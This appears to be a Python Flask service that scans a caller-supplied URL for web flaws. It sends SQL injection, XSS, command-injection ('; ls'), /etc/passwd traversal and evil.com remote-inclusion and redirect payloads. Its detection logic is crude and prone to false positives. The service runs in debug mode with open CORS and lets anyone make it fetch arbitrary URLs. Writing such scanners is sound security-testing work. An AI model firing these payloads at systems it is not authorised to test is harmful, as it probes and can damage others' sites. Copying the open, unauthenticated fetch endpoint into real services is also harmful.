from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

class WebVulnScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.results = []

    def check_sql_injection(self):
        payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*"]
        for payload in payloads:
            url = f"{self.target_url}?id={payload}"
            response = requests.get(url)
            if "error" not in response.text.lower():
                self.results.append(f"Potential SQL Injection vulnerability found at: {url}")

    def check_xss(self):
        payloads = ["<script>alert('XSS')</script>", "'><script>alert('XSS')</script>"]
        for payload in payloads:
            url = f"{self.target_url}?search={payload}"
            response = requests.get(url)
            if payload in response.text:
                self.results.append(f"Potential XSS vulnerability found at: {url}")

    def check_csrf(self):
        response = requests.get(self.target_url)
        if "csrf" not in response.text.lower():
            self.results.append(f"Potential CSRF vulnerability found at: {self.target_url}")

    def check_rfi(self):
        payloads = ["http://evil.com/malicious_file.txt", "../../../../etc/passwd"]
        for payload in payloads:
            url = f"{self.target_url}?file={payload}"
            response = requests.get(url)
            if "error" not in response.text.lower():
                self.results.append(f"Potential RFI vulnerability found at: {url}")

    def check_lfi(self):
        payloads = ["../../../../etc/passwd", "../etc/passwd"]
        for payload in payloads:
            url = f"{self.target_url}?file={payload}"
            response = requests.get(url)
            if "root:" in response.text:
                self.results.append(f"Potential LFI vulnerability found at: {url}")

    def check_command_injection(self):
        payloads = ["; ls", "| ls", "&& ls"]
        for payload in payloads:
            url = f"{self.target_url}?cmd={payload}"
            response = requests.get(url)
            if "root" in response.text or "bin" in response.text:
                self.results.append(f"Potential Command Injection vulnerability found at: {url}")

    def check_open_redirect(self):
        payloads = ["http://evil.com"]
        for payload in payloads:
            url = f"{self.target_url}?redirect={payload}"
            response = requests.get(url)
            if response.url == payload:
                self.results.append(f"Potential Open Redirect vulnerability found at: {url}")

    def run(self):
        self.results.append(f"Scanning {self.target_url} for vulnerabilities...")
        self.check_sql_injection()
        self.check_xss()
        self.check_csrf()
        self.check_rfi()
        self.check_lfi()
        self.check_command_injection()
        self.check_open_redirect()
        self.results.append("Scan complete.")
        return self.results

@app.route('/scan', methods=['POST'])
def scan():
    url = request.json.get('url')
    if not url:
        return jsonify({'error': 'URL is required'}), 400

    scanner = WebVulnScanner(url)
    results = scanner.run()
    return jsonify(results)

if __name__ == "__main__":
    app.run(debug=True)